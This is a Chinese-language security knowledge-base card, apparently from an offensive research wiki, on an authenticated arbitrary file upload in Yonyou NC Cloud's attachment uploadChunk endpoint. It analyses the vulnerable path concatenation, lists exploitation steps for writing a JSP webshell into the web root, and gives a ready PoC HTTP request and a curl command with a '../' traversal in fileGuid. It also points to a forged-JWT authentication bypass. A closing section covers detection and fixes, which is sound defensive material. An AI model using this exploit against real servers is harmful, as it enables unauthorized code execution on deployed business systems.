---
id: web-java-component-yonyou-nccloud-attachment-uploadchunk-fileguid-traversal
title: 用友 NC Cloud /ncchr/pm/fb/attachment/uploadChunk 任意文件上传：fileGuid 与原始文件名未过滤，路径穿越写 JSP
type: scenario
domain: web
path: web/java/component
technique: yonyou-nccloud-attachment-uploadchunk-fileguid-filename-traversal
tags:
- java
- yonyou
- nccloud
- ncchr
- file-upload
- path-traversal
- multipart
- webshell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V626
  verified_at: '2026-11-12T23:26:17+08:00'
  notes: 已通读原文并逐张核对22张图：AttachmentController @RequestMapping(/pm/fb/attachment)、uploadChunk POST参数、uploadAttachment中filePath=SpringHelper.getRealPath()+attachment_temp_folder+scope、tempFileDir=filePath+fileGuid、getOriginalFilename→new File(tempFileDir,fileName)、multipart分片.part与append复制，均与卡一致。已修正：本机JDK8实测new File(parent,child)对绝对路径child不会脱离parent，删除原“绝对路径穿越”表述；补充filename路径是否保留取决于容器/解析器、实战优先用fileGuid。原文仅代码审计无写入并访问JSP实测，confidence medium保留。dedup：与U8Cloud IFileTrans、NC createSkinFile、海康iSecure及通用filename traversal卡均为不同产品/接口/sink，非同链；dup-scan无涉及pair。affected_versions原文未给未设置。未验证点：未本机复现，穿越层级需按部署实测。
url: /docs/web/java/component/web-java-component-yonyou-nccloud-attachment-uploadchunk-fileguid-traversal/
draft: false
kb_aliases:
- 用友 NC Cloud 任意文件上传
- uploadChunk 文件上传
- AttachmentController uploadChunk
- attachmentService.uploadAttachment
- fileGuid 路径穿越
- NC Cloud getshell
---

## 一句话结论

用友 NC Cloud 的 `AttachmentController`（`@RequestMapping("/pm/fb/attachment")`）提供 `POST /uploadChunk` 分片上传接口，`fileGuid` 被直接字符串拼接进临时目录路径、`MultipartFile.getOriginalFilename()` 作为文件名直接 `new File(tempFileDir, fileName)` 落盘，两者均无过滤；攻击者用 `fileGuid` 中的 `../` 穿越即可把任意内容写到进程可写的任意目录，配合可解析目录写 JSP WebShell。

## 原理

- **路由**：`AttachmentController` 由 `@RestController` 标注，类级 `@RequestMapping({"/pm/fb/attachment"})`；`uploadChunk` 方法映射 `value = {"/uploadChunk"}, method = POST`，接收 `HttpServletRequest request, MultipartFile file, Integer chunk, Integer chunks, String fileGuid, String operation`，最终调用 `attachmentService.uploadAttachment(file, fileGuid, chunk, operation, isMultipart, chunk == chunks - 1)`。
- **路径拼接**（服务实现）：
  ```java
  String filePath = SpringHelper.getRealPath()
      + "attachment_temp_folder" + File.separator + AppContext.getContext().getScope();
  String tempFileDir = filePath + fileGuid;
  new File(tempFileDir).mkdirs();
  String fileName = file.getOriginalFilename();
  File destTempFile = new File(tempFileDir, fileName);
  ```
  `fileGuid` 是请求参数原样字符串拼接，未做 `../` 清洗或规范化校验，`filePath + fileGuid` 可穿越到任意父目录；`fileName` 取自 multipart 原始文件名，代码未清洗（注意 Java `new File(parent, child)` 只做路径拼接，绝对路径 child 仍落在 parent 下，实际穿越主要靠 `fileGuid`；且部分容器/multipart 解析器会剥离 filename 中的路径，需按目标环境实测）。
- **写入方式**：multipart 时先把分片写到 `new File(parentFileDir, fileGuid + "_" + chunk + ".part")`，再以 append 方式复制进 `destTempFile`，末分片（`chunk == chunks - 1`）后继续后续处理；非 multipart 时直接 `FileUtils.copyInputStreamToFile(file.getInputStream(), destTempFile)`。文件名扩展名与内容均不受限制。
- **为什么成立**：任意文件上传的危害取决于“路径可控 + 内容可控 + 落到可解析目录”三要素。此处三个条件全部满足：`fileGuid`/filename 控制路径、multipart 内容控制写什么、`SpringHelper.getRealPath()` 说明落点在 Web 应用实际目录体系内，穿越到 `webapps/ROOT` 等可执行目录即可写 JSP。根因是把用户输入当路径拼接且缺少 canonical path 白名单校验。
- **前提**：该接口位于 `/ncchr/*` 之下，受 `LoginFilter` 保护，需先通过鉴权（可用同文章中的 JWT 硬编码密钥伪造 `accessTokenNcc`，见关联卡）。

## 触发条件

- 目标为存在该 `AttachmentController` 的用友 NC Cloud 版本，`/ncchr/pm/fb/attachment/uploadChunk` 可达。
- 已能通过 `ncchr` 鉴权（伪造/合法 `accessTokenNcc`）。
- 应用进程账号对目标写入目录有写权限（附件临时目录默认可写，Web 目录视部署方式而定）。
- 能构造合法 multipart 请求，`chunk/chunks` 与分片逻辑匹配（单片上传时 `chunk=0, chunks=1` 走末片分支）。

## 利用步骤

1. 通过 `ncchr` 鉴权得到可用的 `accessTokenNcc` 头（参考关联的 JWT 硬编码密钥卡）。
2. 计算目标路径：确认 `SpringHelper.getRealPath()` 指向的应用根（附件临时目录位于其下 `attachment_temp_folder/<scope>/`），用 `fileGuid` 中的 `../` 逐级回退到 Web 可解析目录（如 `../../` 到 `webapps/ROOT`）。
3. 发送 multipart POST：`fileGuid` 为穿越序列，`file` 的 filename 为 `shell.jsp`，内容为 JSP 代码，`chunk=0&chunks=1&operation=...`。
4. 访问写入的 JSP URL 验证执行；若目录不可解析，可改为写配置文件/覆写已有文件等其他目的。
5. 若不成功，检查进程账号权限与目标目录，或改用非分片分支。

## PoC

最小化请求（需自备有效 `accessTokenNcc`）：

```http
POST /ncchr/pm/fb/attachment/uploadChunk HTTP/1.1
Host: target
accessTokenNcc: <伪造/合法 JWT>
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@ page import="java.util.*" %><% out.println("ok"); %>
------x
Content-Disposition: form-data; name="fileGuid"

../../webapps/ROOT/upload
------x
Content-Disposition: form-data; name="chunk"

0
------x
Content-Disposition: form-data; name="chunks"

1
------x
Content-Disposition: form-data; name="operation"

------
```

```bash
curl -k "http://target/ncchr/pm/fb/attachment/uploadChunk" \
  -H "accessTokenNcc: <JWT>" \
  -F "file=@shell.jsp;filename=shell.jsp" \
  -F "fileGuid=../../webapps/ROOT/upload" \
  -F "chunk=0" -F "chunks=1" -F "operation="
```

原文以代码审计展示拼接链与“文件类型可控、可 `../` 穿越、可上传 JSP 至可执行目录”的结论；未提供完整写入并访问 JSP 的实测截图，`fileGuid` 具体穿越层级与落盘目录需按目标部署实测调整（filename 路径是否保留取决于容器/解析器，实战优先用 `fileGuid`），故 confidence 定为 medium。

## 变体与关联

- **同一控制器的其他上传入口**：`/pm/fb/attachment` 下其他方法（如普通附件上传）可能共用 `uploadAttachment` 实现，同样检查 `fileGuid`/filename 过滤。
- **前置绕过**：需先通过 [[web-java-component-yonyou-nccloud-ncchr-loginfilter-jwt-defaultsecret-bypass]]。
- **同厂商文件上传**：[[web-java-component-yonyou-u8-nccloudgateway-ifiletrans-file-upload]]（U8 Cloud NCCloudGatewayServlet/IFileTrans）、[[web-java-component-yonyou-nc-portalspec-createskinfile-upload]]（NC createSkinFile 双编码绕过）、[[web-java-component-yonyou-u8oa-operafileactioncontroller-arbitrary-file-overwrite]]。
- **通用文件名穿越**：见 [[web-generic-file-upload-multi-step-fileid-filename-traversal]]、[[web-generic-file-upload-adonisjs-bodyparser-filename-traversal]]。

## 检测与防御

- **修复**：`fileGuid` 与 `getOriginalFilename` 一律做 canonical path 校验，限制在附件目录内且扩展名白名单；临时文件名改用服务端生成的 UUID；禁止 `../` 与绝对路径；上传目录关闭脚本解析（`.jsp`/`.jspx` 不可执行）。
- **升级**：联系厂商获取 NC Cloud 补丁。
- **检测**：`/ncchr/pm/fb/attachment/uploadChunk` 请求中 `fileGuid` 含 `..`、`/`、`\` 或绝对路径；multipart filename 为 `.jsp/.jspx` 等可执行扩展名；附件目录出现非 GUID 命名的脚本文件；Web 目录中出现新 JSP 及其访问。
- **纵深防御**：Web 应用运行账号对 Web 目录只读，上传目录与 Web 可执行目录物理分离。
